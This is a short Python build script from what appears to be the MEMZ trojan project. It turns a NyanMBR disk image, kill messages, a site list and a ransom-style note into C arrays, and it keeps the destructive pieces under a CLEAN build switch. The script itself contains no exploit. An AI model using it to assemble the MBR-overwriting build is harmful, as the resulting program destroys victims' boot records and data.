# Shitty script to convert MEMZs data into C source

import sys

MBRCODE  = "../NyanMBR/disk.img"

NOTE     = "Data/Note.txt"
KILLMSGS = "Data/KillMessages.txt"
SITES    = "Data/Sites.txt"

MODE_BOTH = 0
MODE_DESTRUCTIVE = 1
MODE_CLEAN = 2

with open(sys.argv[1], "w") as cf:
	with open(sys.argv[2], "w") as hf:
		def writeMode(mode, start):
			if start:
				if mode == MODE_DESTRUCTIVE:
					cf.write("#ifndef CLEAN\n")
					hf.write("#ifndef CLEAN\n")
				elif mode == MODE_CLEAN:
					cf.write("#ifdef CLEAN\n")
					hf.write("#ifdef CLEAN\n")
			else:
				if mode != MODE_BOTH:
					cf.write("#endif\n")
					hf.write("#endif\n")
		
		def writeArray(name, mode, data, func, type, length):
			writeMode(mode, True)
			
			cf.write("const %s %s[] = {" % (type, name))
			cf.write(", ".join([func(x) for x in data]))
			cf.write("};\n")
			hf.write("extern const %s %s[];\n" % (type, name))

			hf.write("#define %sLen %d\n" % (name, length))
			
			writeMode(mode, False)
			
		def writeStringArray(name, mode, data):
			writeArray(name, mode, data, lambda x: '"' + x.replace("\\n", "\r\n").encode("string_escape") + '"', "char *", len(data))
			
		def writeStringArrayFromFile(fname, name, mode):
			with open(fname, "r") as inf:
				writeStringArray(name, mode, inf.read().splitlines())
			
		def writeBinaryArray(name, mode, data):
			writeArray(name, mode, data, lambda x: str(ord(x)), "unsigned char", len(data))
			
		def writeString(name, mode, data):
			writeMode(mode, True)
			
			cf.write("const char *" + name + ' = "')
			cf.write(data.replace("\r\n", "\n").replace("\n", "\r\n").encode("string_escape"))
			cf.write('";\n')
			
			hf.write("extern const char *" + name + ";\n")
			hf.write("#define %sLen %d\n" % (name, len(data)))
			
			writeMode(mode, False)
			
		def writeStringFromFile(fname, name, mode):
			with open(fname, "r") as inf:
				writeString(name, mode, inf.read())
		
		cf.write('#include "Data.h"\n')
		
		hf.write("#pragma once\n")
		hf.write('#include "../Source/MEMZ.h"\n')
		
		# MBR Binary
		with open(MBRCODE, "rb") as inf:
			writeBinaryArray("mbrStage1", MODE_DESTRUCTIVE, inf.read(510).rstrip(chr(0)))
			writeBinaryArray("mbrStage2", MODE_DESTRUCTIVE, inf.read().rstrip(chr(0)))
			
		writeStringArrayFromFile(KILLMSGS, "KillMessages", MODE_DESTRUCTIVE) # Kill Messages
		writeStringArrayFromFile(SITES, "Sites", MODE_BOTH)                  # Sites/Programs
		writeStringFromFile(NOTE, "Note", MODE_DESTRUCTIVE)                  # Start Note